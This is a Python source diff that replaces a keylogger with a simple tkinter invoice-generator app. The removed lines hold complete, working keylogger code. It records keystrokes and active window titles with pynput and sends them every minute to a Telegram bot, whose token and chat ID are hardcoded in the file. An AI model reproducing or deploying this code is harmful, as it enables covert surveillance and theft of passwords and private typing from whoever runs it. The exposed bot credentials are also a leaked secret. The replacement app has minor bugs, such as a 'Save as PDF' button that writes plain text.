@@ -1,60 +1,118 @@
-#!/usr/bin/env python3
-
+import tkinter as tk
+from tkinter import messagebox, filedialog
 import os
-import time
-import requests
-from pynput import keyboard
-from datetime import datetime
 
-# === CONFIGURATION ===
-BOT_TOKEN = "7414600368:AAFrI8_6mCllDlyYAUya3Xc3vkScLF2eR6U"
-CHAT_ID = "5961669242"
-LOG_INTERVAL = 60  # seconds between sending logs
+# === Global Variable ===
+total = 0
 
-log_buffer = []
-
-def get_active_window():
+# === Functions ===
+def add_item():
     try:
-        return os.popen("xdotool getactivewindow getwindowname").read().strip()
+        item = entry_product.get()
+        qty = int(entry_qty.get())
+        price = float(entry_price.get())
+        amount = qty * price
+        invoice_listbox.insert(tk.END, f"{item:<30} {amount}")
+        global total
+        total += amount
+        total_label.config(text=f"Total: {total}")
+        entry_product.delete(0, tk.END)
+        entry_qty.delete(0, tk.END)
+        entry_price.delete(0, tk.END)
     except:
-        return "Unknown"
+        messagebox.showerror("Error", "Please enter valid values")
 
-def send_to_telegram(message):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    payload = {"chat_id": CHAT_ID, "text": message}
+def save_invoice():
+    file = filedialog.asksaveasfile(defaultextension=".txt", filetypes=[("Text Files", "*.txt")])
+    if file:
+        for i in range(invoice_listbox.size()):
+            file.write(invoice_listbox.get(i) + "\n")
+        file.write(f"\nTotal: {total}")
+        file.close()
+        messagebox.showinfo("Saved", "Invoice saved successfully!")
+
+def delete_item():
     try:
-        requests.post(url, data=payload)
+        selected_index = invoice_listbox.curselection()
+        if selected_index:
+            item_text = invoice_listbox.get(selected_index)
+            amount = int(item_text.split()[-1])
+            global total
+            total -= amount
+            total_label.config(text=f"Total: {total}")
+            invoice_listbox.delete(selected_index)
+        else:
+            messagebox.showwarning("Warning", "Please select an item to delete.")
     except Exception as e:
-        print(f"Telegram error: {e}")
+        messagebox.showerror("Error", f"An error occurred: {e}")
 
-def on_press(key):
+def print_invoice():
     try:
-        key_str = key.char if hasattr(key, 'char') and key.char else str(key)
-    except:
-        key_str = str(key)
-    window = get_active_window()
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    log_entry = f"[{timestamp}] {window} → {key_str}"
-    log_buffer.append(log_entry)
+        file = open("invoice_temp.txt", "w", encoding="utf-8")
+        for i in range(invoice_listbox.size()):
+            file.write(invoice_listbox.get(i) + "\n")
+        file.write(f"\nTotal: {total}")
+        file.close()
+        # os.startfile("invoice_temp.txt", "print")  ← تم التعليق عليه مؤقتاً لتفادي الخطأ أثناء التحويل لـ EXE
+    except Exception as e:
+        messagebox.showerror("Error", f"Printing failed: {e}")
 
-def flush_logs():
-    if log_buffer:
-        message = "\n".join(log_buffer)
-        send_to_telegram(f"🧠 Keylog Report:\n{message}")
-        log_buffer.clear()
+# === UI Setup ===
+window = tk.Tk()
+window.title("Invoice Generator")
+window.geometry("500x600")
+window.config(bg="white")
 
-def start_keylogger():
-    print("🔐 Keylogger started (Ctrl+C to stop)...")
-    listener = keyboard.Listener(on_press=on_press)
-    listener.start()
+# Title
+title_label = tk.Label(window, text="Invoice Generator", font=("Arial", 16, "bold"), bg="white")
+title_label.pack(pady=10)
 
-    try:
-        while True:
-            time.sleep(LOG_INTERVAL)
-            flush_logs()
-    except KeyboardInterrupt:
-        flush_logs()
-        print("🛑 Keylogger stopped.")
+# Customer Name
+tk.Label(window, text="Customer Name:", bg="white").pack()
+entry_customer = tk.Entry(window)
+entry_customer.pack()
 
-if __name__ == "__main__":
-    start_keylogger()
+# Product
+tk.Label(window, text="Product/Service:", bg="white").pack()
+entry_product = tk.Entry(window)
+entry_product.pack()
+
+# Quantity
+tk.Label(window, text="Quantity:", bg="white").pack()
+entry_qty = tk.Entry(window)
+entry_qty.pack()
+
+# Price
+tk.Label(window, text="Price per Unit:", bg="white").pack()
+entry_price = tk.Entry(window)
+entry_price.pack()
+
+# Add Item Button
+btn_add = tk.Button(window, text="Add Item", command=add_item, bg="#c3f2b5")
+btn_add.pack(pady=5)
+
+# Listbox
+invoice_listbox = tk.Listbox(window, width=50)
+invoice_listbox.pack(pady=10)
+
+# Total Label
+total_label = tk.Label(window, text="Total: 0", bg="white", font=("Arial", 12, "bold"))
+total_label.pack()
+
+# Save Button
+btn_save = tk.Button(window, text="Save as PDF", command=save_invoice, bg="#d0e0ff")
+btn_save.pack(pady=5)
+
+# Delete Button
+btn_delete = tk.Button(window, text="Delete Selected Item", command=delete_item, bg="#ff9999")
+btn_delete.pack(pady=5)
+
+# Print Button
+btn_print = tk.Button(window, text="Print Invoice", command=print_invoice, bg="#ccffcc")
+btn_print.pack(pady=5)
+
+# Signature
+signature_label = tk.Label(window, text="Designed by Eng. Ruaa Aziz Al-Mousawi @Ruaa0aziz", fg="gray", bg="white", font=("Arial", 8))
+signature_label.pack(side="left", padx=10, pady=10)
+
+window.mainloop()
